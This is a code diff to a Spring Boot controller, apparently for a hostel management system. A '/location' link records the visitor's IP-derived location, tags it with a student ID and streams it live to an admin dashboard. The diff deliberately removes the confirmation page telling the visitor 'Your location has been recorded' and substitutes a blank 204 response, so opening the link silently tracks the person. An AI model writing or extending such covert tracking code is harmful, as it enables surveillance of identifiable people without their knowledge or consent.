@@ -3,6 +3,7 @@ package com.secure.hms.controller;
 import com.secure.hms.service.LocationService;
 import jakarta.servlet.http.HttpServletRequest; // Spring Boot 2 -> javax.servlet.http.HttpServletRequest
 import org.springframework.http.MediaType;
+import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
@@ -20,22 +21,21 @@ public class LocationController {
         this.locationService = locationService;
     }
 
-    // ---- Student page ----  just OPENING this link captures the location (network/IP) ----
+    // ---- Student link ----  just OPENING this captures the network/IP location, then returns nothing ----
     // Optional: pass the student id -> /location?userId=STUDENT123  (so the admin sees who)
-    @GetMapping(value = "/location", produces = MediaType.TEXT_HTML_VALUE)
-    public String studentPage(@RequestParam(required = false) String userId,
-                              HttpServletRequest httpRequest) {
+    @GetMapping("/location")
+    public ResponseEntity<Void> captureLocation(@RequestParam(required = false) String userId,
+                                                HttpServletRequest httpRequest) {
         String clientIp = getClientIp(httpRequest);
 
         Map<String, Object> body = new HashMap<>();
         if (userId != null) {
             body.put("userId", userId);
         }
-        // No GPS coords in the body -> service uses the network/IP location only,
-        // then broadcasts it live to the admin dashboard.
+        // No GPS coords -> service uses network/IP location only, then broadcasts to the admin.
         locationService.processLocation(body, clientIp);
 
-        return CAPTURED_PAGE;
+        return ResponseEntity.noContent().build();   // 204, blank page
     }
 
     // ---- Admin dashboard subscribes here for the live feed ----
@@ -58,26 +58,6 @@ public class LocationController {
         }
         return request.getRemoteAddr();
     }
-
-    private static final String CAPTURED_PAGE = """
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <title>HMS - Location</title>
-        <style>
-          body{font-family:system-ui,Arial,sans-serif;max-width:480px;margin:60px auto;padding:0 16px;text-align:center;}
-          h1{font-size:22px;}
-          .ok{color:#16a34a;font-size:18px;font-weight:600;}
-        </style>
-        </head>
-        <body>
-        <h1>Thank you</h1>
-        <p class="ok">Your location has been recorded.</p>
-        </body>
-        </html>
-        """;
 
     private static final String ADMIN_PAGE = """
         <!DOCTYPE html>
